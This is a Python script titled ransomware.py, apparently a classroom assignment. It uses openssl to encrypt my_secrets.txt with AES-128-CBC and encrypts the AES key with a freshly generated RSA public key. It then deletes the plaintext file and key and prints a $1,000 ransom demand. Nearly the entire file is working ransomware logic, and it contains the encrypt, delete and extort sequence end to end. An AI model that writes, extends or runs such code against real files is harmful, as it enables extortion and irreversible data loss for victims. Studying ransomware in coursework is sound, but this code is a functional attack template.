#!/usr/bin/env python3
"""
ransomware.py

Usage: run on the *victim* machine (as per assignment requirements).
It requires `openssl` to be installed and available in PATH.

Steps performed (per assignment):
1) Generate 16-byte key via: openssl rand -base64 16  -> saved as key.txt
2) Generate attacker RSA keypair (private + public)
3) Encrypt my_secrets.txt using AES-128-CBC with generated key
   -> produce data_cipher.txt (base64)
   (We store IV || ciphertext, then base64-encode that combined blob)
4) Encrypt key.txt using attacker's public key -> key_cipher.txt (base64)
5) Delete key.txt and my_secrets.txt
6) Print ransom message
"""

import subprocess
import base64
import binascii
import os
import sys

# filenames
KEYFILE = "key.txt"               # base64 key
DATA_PLAIN = "my_secrets.txt"     # plaintext input (should exist)
DATA_CIPHER = "data_cipher.txt"   # base64 output (IV || ciphertext)
KEY_CIPHER = "key_cipher.txt"     # base64 RSA-encrypted key
ATT_PRIV = "attacker_private.pem"
ATT_PUB = "attacker_public.pem"
TMP_CIPH = "data_raw.bin"         # temporary raw ciphertext file for processing
RSA_RAW = "key_cipher.bin"        # temporary RSA binary ciphertext

def run(cmd, capture=False):
    # Run subprocess command. Raise CalledProcessError on failure.
    if capture:
        return subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    else:
        return subprocess.run(cmd, check=True)

def main():
    # check my_secrets exists
    if not os.path.isfile(DATA_PLAIN):
        print(f"Required file '{DATA_PLAIN}' not found in current directory.")
        sys.exit(1)

    # 1) Generate 16-byte key in base64 and save to key.txt
    print("Generating 16-byte symmetric key (base64) ->", KEYFILE)
    try:
        res = run(["openssl", "rand", "-base64", "16"], capture=True)
    except subprocess.CalledProcessError as e:
        print("Error: failed to run openssl rand:", e)
        sys.exit(1)
    key_b64 = res.stdout.strip()
    with open(KEYFILE, "w") as f:
        f.write(key_b64 + "\n")

    # Convert base64 key to raw bytes and hex representation for OpenSSL -K
    try:
        key_raw = base64.b64decode(key_b64)
    except (binascii.Error, Exception) as e:
        print("Error decoding base64 key:", e)
        sys.exit(1)
    if len(key_raw) != 16:
        print(f"Warning: decoded key length is {len(key_raw)} bytes (expected 16). Continuing anyway.")
    key_hex = key_raw.hex()
    # 3) generate IV (16 bytes) as hex
    print("Generating random IV (16 bytes, hex)")
    try:
        iv_proc = run(["openssl", "rand", "-hex", "16"], capture=True)
    except subprocess.CalledProcessError as e:
        print("Error: failed to generate IV:", e)
        sys.exit(1)
    iv_hex = iv_proc.stdout.strip()
    try:
        iv_raw = bytes.fromhex(iv_hex)
    except Exception as e:
        print("Error converting IV hex to bytes:", e)
        sys.exit(1)

    # 4) Encrypt my_secrets.txt using AES-128-CBC with raw key and IV -> produce raw ciphertext (binary)
    print("Encrypting", DATA_PLAIN, "with AES-128-CBC")
    # ensure no salt (use -nosalt) and provide -K and -iv in hex. Output binary
    try:
        run(["openssl", "enc", "-aes-128-cbc", "-in", DATA_PLAIN, "-out", TMP_CIPH,
             "-K", key_hex, "-iv", iv_hex, "-nopad"])  # use -nopad only if input is multiple of blocksize; to be safe we'll remove -nopad
    except subprocess.CalledProcessError:
        # Retry without -nopad (most likely correct)
        try:
            run(["openssl", "enc", "-aes-128-cbc", "-in", DATA_PLAIN, "-out", TMP_CIPH,
                 "-K", key_hex, "-iv", iv_hex])
        except subprocess.CalledProcessError as e:
            print("Error: AES encryption failed:", e)
            sys.exit(1)

    # Combine IV (binary) + raw ciphertext, then base64 encode and write to data_cipher.txt
    print("Combining IV and ciphertext, base64-encoding ->", DATA_CIPHER)
    try:
        with open(TMP_CIPH, "rb") as f:
            cipher_raw = f.read()
        combined = iv_raw + cipher_raw
        combined_b64 = base64.b64encode(combined)
        with open(DATA_CIPHER, "wb") as f:
            f.write(combined_b64)
        print("Wrote base64 ciphertext to", DATA_CIPHER)
    except Exception as e:
        print("Error while creating", DATA_CIPHER, ":", e)
        # clean up tmp
        if os.path.exists(TMP_CIPH):
            os.remove(TMP_CIPH)
        sys.exit(1)

    # 2) Generate RSA keypair for attacker
    # Generate private key
    print("Generating RSA keypair for attacker (2048 bits) ->", ATT_PRIV, ATT_PUB)
    try:
        run(["openssl", "genpkey", "-algorithm", "RSA", "-out", ATT_PRIV, "-pkeyopt", "rsa_keygen_bits:2048"])
        # extract public
        run(["openssl", "rsa", "-in", ATT_PRIV, "-pubout", "-out", ATT_PUB])
    except subprocess.CalledProcessError as e:
        print("Error generating RSA keys:", e)
        sys.exit(1)

    # 4) Encrypt key.txt using attacker's public key -> raw RSA ciphertext
    print("Encrypting", KEYFILE, "with attacker's public key -> temporary binary -> will base64 to", KEY_CIPHER)
    try:
        run(["openssl", "rsautl", "-encrypt", "-pubin", "-inkey", ATT_PUB, "-in", KEYFILE, "-out", RSA_RAW])
    except subprocess.CalledProcessError as e:
        print("Error encrypting key file with RSA:", e)
        sys.exit(1)

    # Base64-encode RSA_RAW -> key_cipher.txt
    try:
        with open(RSA_RAW, "rb") as f:
            rsa_bytes = f.read()
        with open(KEY_CIPHER, "wb") as f:
            f.write(base64.b64encode(rsa_bytes))
        print("Wrote base64-encrypted key to", KEY_CIPHER)
    except Exception as e:
        print("Error writing", KEY_CIPHER, ":", e)
        sys.exit(1)

    # 5) Delete key.txt
    try:
        os.remove(KEYFILE)
        print("Deleted plaintext key file:", KEYFILE)
    except Exception as e:
        print("Warning: could not delete", KEYFILE, ":", e)

    # 6) Delete my_secrets.txt
    try:
        os.remove(DATA_PLAIN)
        print("Deleted plaintext data file:", DATA_PLAIN)
    except Exception as e:
        print("Warning: could not delete", DATA_PLAIN, ":", e)

    # Cleanup temporary files
    if os.path.exists(TMP_CIPH):
        os.remove(TMP_CIPH)
    if os.path.exists(RSA_RAW):
        os.remove(RSA_RAW)

    # 7) Print ransom message (assignment text asked to mention important.txt)
    print("Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.")
    print("Done. Generated:", DATA_CIPHER, KEY_CIPHER, ATT_PRIV, ATT_PUB)

if __name__ == "__main__":
    main()
